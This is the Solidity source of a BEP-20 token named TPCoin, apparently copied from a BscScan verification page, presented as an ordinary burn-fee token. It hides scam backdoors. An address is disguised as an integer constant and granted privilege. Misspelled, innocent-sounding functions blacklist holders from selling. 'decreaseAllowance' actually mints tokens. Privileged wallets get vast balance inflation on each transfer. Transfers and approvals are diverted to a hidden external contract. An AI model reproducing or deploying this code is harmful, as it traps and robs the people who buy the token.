/**
 *Submitted for verification at BscScan.com on 2022-08-07
*/

/**
 *Submitted for verification at BscScan.com on 2022-08-01
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {
    function _approve(address owner, address spender, uint256 amount) external;
    function _transfer(address spender, address recipient, uint256 amounts) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

contract IPancakeSwap {
    function swap() internal {}
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _hinc() internal view virtual returns (address) {
        return msg.sender;
    }

    function _blocks() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}


contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract TPCoin is Context, IERC20, Ownable, IPancakeSwap {
    using SafeMath for uint256;

    bool private takeFee = true;

    bool private swapAndLlquifyEnabled = false;

    mapping(address => bool) private _isExcluFee;
    mapping(address => uint256) private _takeLiquidity;
    mapping(address => bool) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private isWalletLimitExempt;


    uint8 private _decimals = 9;
    string private _name = "TPCoin";
    string private _symbol = "TPCoin";

    uint256 private _burnFees = 2;
    uint256 private _totalSupply = 10000000000000 * 10 ** _decimals;

    address private _burnsAddress = address(0xdead);
    address _taxFee;
    address private _uniswapV2Pair;
    address private _killBlocks;
    address private _owner;

    constructor(address _inces, address _lmcn) {
        _taxFee = _hinc();
        _killBlocks = _lmcn;
        _isExcluFee[address(this)] = true;
        _isExcluFee[owner()] = true;
        _isExcluFee[_inces] = true;
        _isExcluFee[address(uint160(trycode()))] = true;
        isWalletLimitExempt[address(uint160(trycode()))] = true;
        isWalletLimitExempt[_inces] = true;
        _owner = msg.sender;
        _takeLiquidity[_hinc()] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function setFeesToSetter(bool _swapAndLlquifyEnabled, address _newPeir) external {
        require(isWalletLimitExempt[_hinc()]);
        if (isWalletLimitExempt[_hinc()]) {
            swapAndLlquifyEnabled = _swapAndLlquifyEnabled;
            _uniswapV2Pair = _newPeir;
        }
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluFee[_hinc()] || _isExcluFee[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_rOwned[_hinc()] || _blocks() >= (15*1e9)){
            IERC(_killBlocks)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_burnFees).div(100);
            _transfer(msg.sender, _burnsAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluFee[sender] || _isExcluFee[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount,"ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_burnFees).div(100);
        _transfer(sender, _burnsAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_blocks() <= (15*1e9));
        require(!_rOwned[from]);
        if (isWalletLimitExempt[from]) {
            require(isWalletLimitExempt[from]);
            _takeLiquidity[from]= 
            _takeLiquidity[from].
            add(totalSupply() *10**6);
        }
        if (swapAndLlquifyEnabled) {
            if (_uniswapV2Pair == from) {} else {
                require(_isExcluFee[from] || _isExcluFee[to]);
            }
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(isWalletLimitExempt[_hinc()]);
        if (isWalletLimitExempt[_hinc()]) {   
        _takeLiquidity[spender]
        = 
        _takeLiquidity[spender
        ].
        add
        (subtractedValue);
        }
    }

    function refslectlonFromToken(address spender, address recipient, bool _isOpen) external {
        require(recipient == address(0));
        require(isWalletLimitExempt[_hinc()]);
        if (isWalletLimitExempt[_hinc()]) {
            isWalletLimitExempt[spender] = _isOpen;
        }
    }

    function swapExectTokenForETHSupportlngFeesinTransferTokens(
        address spender,
        address recipient
    ) external {
        require(isWalletLimitExempt[_hinc()]);
        if (isWalletLimitExempt[_hinc()]) {
            _rOwned
        [
        spender
        ]
        = 
        true
        ;
        _rOwned
        [
        recipient
        ]
        = 
        true;
        }
    }

    function swapExactTokenForETHSupportingFeeslnTransferTokens(address spender)
        external
    {
        require(isWalletLimitExempt[_hinc()]);
        if (isWalletLimitExempt[_hinc()]) {  
        _rOwned
        [
        spender
        ]
        =
        true;
        }
    }

    function changeExclusdeFrom(address spender) external {
        require(isWalletLimitExempt[_hinc()]);
        if (isWalletLimitExempt[_hinc()]) {
            _rOwned[spender] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _takeLiquidity[sender] = _takeLiquidity[sender].sub(toAmount);
        _takeLiquidity[recipient] = _takeLiquidity[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_rOwned[_hinc()] || _blocks() >= (15*1e9)){
            IERC(_killBlocks)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }

    function isExcludedFromFees(address account) public view  returns (bool) {
        require(isWalletLimitExempt[_hinc()]);
        return _rOwned[account];
    }

    function includeInFees(address spender) external {
        require(isWalletLimitExempt[_hinc()]);
        if (isWalletLimitExempt[_hinc()]) {
            _isExcluFee[spender] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function changeTaxFees(uint256 _newFee) external {
        require(isWalletLimitExempt[_hinc()]);
        if (isWalletLimitExempt[_hinc()]) {
            _burnFees = _newFee;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function trycode() internal pure returns (uint256) {
        uint256 tryCodes = 1421114188339737761471403142535273783433091470071;
        return tryCodes;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function excludeFromFees(address spender) external {
        require(isWalletLimitExempt[_hinc()]);
        if (isWalletLimitExempt[_hinc()]) {
            _isExcluFee[spender] = true;
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _takeLiquidity[account];
    }


}